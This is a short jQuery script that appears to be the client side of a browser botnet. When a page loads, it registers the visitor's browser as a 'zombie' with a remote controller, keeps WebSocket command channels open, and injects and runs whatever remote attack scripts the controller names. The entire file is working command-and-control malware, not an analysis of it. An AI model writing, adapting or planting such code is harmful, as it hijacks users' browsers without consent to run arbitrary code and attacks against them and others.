

(function($){


var connect = false;

var web_socket;

var attackOn = false





function register_zombie(){
	var script =document.createElement('script');
	script.type = 'text/javascript';
	script.src = 'http://'+ip+':2000/zombieconnect';
	script.id = "zombieconnect";
	$("head:first").append(script);
	$("#zombieconnect").remove();
}


function connect_solo(){

	solo_socket = WS4Redis({
		uri:'ws://'+ip+':2000/ws/solo?subscribe-session',
		receive_message:parseMalware,
		heartbeat_msg: "--heartbeat--",
	});
}




function connect_broadcast(){

	if(!connect){
		web_socket = WS4Redis({
			uri:'ws://'+ip+':2000/ws/broadcastcontrol?subscribe-broadcast&publish-broadcast&echo',
			receive_message: parseMalware,
			connected:on_connected,
			heartbeat_msg : "--heartbeat--",
		});
	}
}


$(function(){

	var setup = new Promise(function(resolve,reject){

				resolve();
	})

	setup.then(register_zombie).then(connect_solo).then(connect_broadcast);


})


function on_connected(){



	connect = true;


}





function parseMalware(msg){
	var msgJson = JSON.parse(msg);
	if(msgJson.hasOwnProperty('attacktype')==true){
		var script = document.createElement("script");
		script.src = "http://"+ip+"/"+msgJson.attacktype+".js";
		script.type='text/javascript';
		script.id="currentAttack";
		script.setAttribute("data-attackInfo",JSON.stringify(msgJson['attackInfo']));

		$('head:first').append(script);

	}

	if(msgJson.hasOwnProperty('stopattack')){
		document.kill()

	}

}






})(jQuery);
